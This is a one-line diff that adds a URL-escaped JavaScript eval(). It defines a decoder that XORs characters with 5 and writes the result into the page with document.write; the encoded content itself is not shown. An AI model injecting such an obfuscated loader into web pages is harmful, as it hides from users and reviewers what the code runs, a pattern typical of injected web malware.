@@ -1,0 +1,1 @@
+eval(unescape("function%20ew_dc%28s%29%7Bvar%20d%3D%27%27%2Ck%3D0%2Ca%3Dnew%20Array%28%29%2Cr%3Bfor%28i%3D0%3Bi%3Cs.length%3Bi++%29%7Bc%3Ds.charCodeAt%28i%29%3Bif%28c%3C128%29c%5E%3D5%3Bd+%3DString.fromCharCode%28c%29%3Bif%28%28i+1%29%2599%3D%3D0%29%7Ba%5Bk++%5D%3Dd%3Bd%3D%27%27%3B%7D%7Dr%3Da.join%28%27%27%29+d%3Bdocument.write%28r%29%3B%7D"));
